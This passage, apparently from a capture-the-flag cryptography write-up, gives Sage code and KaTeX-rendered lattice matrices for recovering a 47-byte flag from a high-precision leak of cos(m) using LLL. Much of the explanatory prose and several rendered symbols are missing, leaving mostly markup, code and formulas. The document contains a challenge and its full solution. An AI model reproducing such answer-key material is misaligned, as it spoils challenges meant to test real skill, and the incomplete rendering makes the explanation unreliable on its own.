mat)</span><br><span class="line">x, m = M.LLL()[<span class="number">0</span>]</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">47</span></span><br><span class="line">leak = cos(m).n(<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="comment"># 0.930663173858708735013864574261632487708466528608503618563619854272677238694112204757817175383567864768566170130001514302467697072153084760545849543698249360760783987526742296036337216144968878436793442305949050751417113202760217838648422727760945579644861599148512584771382319668482598215317149996430</span></span><br></pre></td></tr></table></figure><p><code>cos(m)</code>1000<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo><mo>+</mo><mn>2</mn><mi>k</mi><mi></mi></mrow><annotation encoding="application/x-tex">m=arccos(leak)+2k\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo></mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo><mo></mo><mn>2</mn><mi>k</mi><mi></mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">m-arccos(leak)-2k\pi=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span><br /></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi></mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">L = \begin{bmatrix}1 &amp; 0 &amp; 1 \\0 &amp; 1 &amp; arccos(leak)\\0 &amp; 0 &amp; 2\pi\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;"></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><mi>k</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo></mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi></mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext></mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}m &amp; -1 &amp; -k\end{bmatrix}*\begin{bmatrix}1 &amp; 0 &amp; 1 \\0 &amp; 1 &amp; arccos(leak)\\0 &amp; 0 &amp; 2\pi\\\end{bmatrix}\ =\begin{bmatrix}m &amp; -1 &amp; 0\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;"></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><p><code>LLL</code><br /><strong></strong><code>wp</code><br /><code>flag</code>47<code>m</code>376</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><mi>k</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo></mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>760</mn></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>376</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>760</mn></msup><mo></mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>760</mn></msup><mo></mo><mn>2</mn><mi></mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext></mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>m</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo></mo><msup><mn>2</mn><mn>376</mn></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix}m &amp; -1 &amp; -k\end{bmatrix}*\begin{bmatrix}1 &amp; 0 &amp; 2^{760} \\0 &amp; 2^{376} &amp; 2^{760}*arccos(leak)\\0 &amp; 0 &amp; 2^{760}*2\pi\\\end{bmatrix}\ =\begin{bmatrix}m &amp; -2^{376} &amp; 0\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">6</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">6</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">c</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">6</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;"></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" 